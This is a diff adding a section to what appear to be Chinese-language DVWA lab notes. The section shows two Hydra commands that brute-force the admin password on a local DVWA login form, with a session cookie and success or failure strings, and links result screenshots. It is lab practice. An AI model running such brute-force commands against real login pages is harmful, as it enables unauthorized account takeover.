@@ -149,6 +149,19 @@ if (!mysqli_query(GLOBALS["___mysqli_ston"], query)) {
 <img width="1353" height="1287" alt="image" src="https://github.com/user-attachments/assets/439570ec-478a-4f95-a45d-0ef87fdd2783" />
 <img width="1351" height="1292" alt="image" src="https://github.com/user-attachments/assets/a3a87775-4b36-44c2-a111-86b5c2245804" />
 
+### 使用Hydra 来进行暴力破解
+```sh
+hydra -l admin -P pass1000.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=44jv2j1tho7m6vp022r0vrfb02; security=low:S=Welcome to the password protected area admin"
+```
+<img width="2116" height="435" alt="image" src="https://github.com/user-attachments/assets/fe072e95-c834-414f-9deb-2ce7834e4ad2" />
+
+```sh
+hydra -l admin -P pass1000.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=44jv2j1tho7m6vp022r0vrfb02; security=low:F=Username and/or password incorrect."
+```
+
+<img width="2136" height="458" alt="image" src="https://github.com/user-attachments/assets/c0999122-e50e-4111-a29d-7db4ed7a7529" />
+
+
 
 
 
